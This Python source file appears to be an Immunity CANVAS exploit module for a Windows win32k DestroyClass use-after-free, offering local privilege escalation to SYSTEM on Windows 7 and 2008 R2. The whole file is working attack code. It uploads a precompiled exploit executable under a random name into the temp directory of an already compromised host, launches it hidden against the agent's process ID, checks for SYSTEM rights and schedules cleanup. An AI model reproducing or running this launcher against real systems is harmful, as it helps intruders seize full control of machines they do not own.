#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  destroyclass_uaf_lpe.py
## Description:  An elevation of privilege vulnerability exists when Windows
##               improperly handles calls to win32k!DestroyClass
## Created_On :  Mon Apr 14 2019
## Created_By :  Nox
##
## (c) Copyright 2019, Immunity, Inc. all rights reserved.
################################################################################

import os
import sys
import time
import random
import logging

if "." not in sys.path:
    sys.path.append(".")

import canvasengine
from exploitutils import *
from libs.canvasos import canvasos
from libs.node_utils import update_graph_node

from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from ExploitTypes.localexploit import LocalExploit


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.node           = None
        self.name           = NAME
        self.local_path     = os.path.dirname(__file__)
        self.binaries_path  = os.path.join(self.local_path, "Resources")

    def write_file_remote(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = "x64" if (self.is_64bit_node() or self.has_wow64()) else "x86"

        xpl_orig_name = "exploit_x86.exe"
        if t_os.arch == "x64":
            xpl_orig_name = "exploit_x64.exe"

        local_exploit_path = os.path.join(self.binaries_path, xpl_orig_name)

        tmp_path = self.node.shell.GetTempPathA()
        if not tmp_path:
            logging.error("Could not resolve full temp directory path")
            return False
        else:
            logging.info("Temp directory: %s" % tmp_path)

        if self.node.shell.chdir(tmp_path) < 0:
            logging.error("Could not chdir into %s" % tmp_path)
            return False

        remote_exploit_name = "%s.exe" % random.randint(10001, 99999)
        remote_exploit_path = tmp_path + remote_exploit_name

        if not self.nodeUpload(local_exploit_path, remote_exploit_path):
            logging.error("Failed to upload the EXE")
            return False

        return remote_exploit_path

    def spawn_process(self, path, pid):
        logging.info("Spawning exploit: %s" % path)

        try:
            cmd_line = path + " " + pid
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 0,
                                                 dwCreationFlags = 0x08000000)
            return True
        except Exception, ex:
            logging.error("%s" % ex)
            return False

    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.node = node
            if not self.is_windows_node():
                continue

            if not any([self.is_win7_node(),
                        self.is_win2008r2_node()]):
                logging.warning("Not 2008R2 / 7 node! Aborting")
                continue

            if not (self.has_wow64() or self.is_64bit_node()):
                logging.warning("This exploit only work in x64 arch")
                continue

            if self.compromised():
                logging.warning("It appears you are already running as LOCAL/SYSTEM")
                continue

            path = self.write_file_remote()
            if path == False:
                return False


            pid  = self.node.shell.getpid()
            arg1 = "%s" % pid
            logging.info("PID: %s" % pid)
            if not self.spawn_process(path, arg1):
                logging.error('Could not spawn %s' % NAME)
                return False

            isCompromised = False
            for i in range(0, 10):
                if self.compromised():
                    update_graph_node(node, self.engine, self.node.shell.whoami())
                    isCompromised = True
                    break
                time.sleep(1)

            time.sleep(3)

            self.add_file_for_cleanup(path)

            if not isCompromised:
                logging.error("Fail %s to get SYSTEM privileges" % NAME)
                logging.error("Probably the target not is vulnerable")
                return False

            ret +=1

        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v%s" % (DESCRIPION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
